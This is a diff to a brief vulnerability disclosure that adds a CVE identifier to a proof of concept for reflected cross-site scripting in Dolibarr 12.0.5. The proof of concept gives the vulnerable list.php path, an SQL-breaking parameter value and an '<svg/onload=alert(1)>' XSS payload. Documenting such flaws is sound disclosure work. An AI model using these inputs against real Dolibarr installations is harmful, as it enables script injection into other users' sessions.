@@ -1,4 +1,4 @@
-# Dolibar 12.0.5 Reflected Cross-Site-Scripting Via Sql Error Page
+# Dolibar 12.0.5 Reflected Cross-Site-Scripting Via Sql Error Page CVE-2022-30875
 ### Path: http://localhost/user/list.php?sortfield=1=14&sortorder=25
 ### Sql paylaod : 1=14
 ### Xss Paylaod :  <svg/onload=alert(1)>
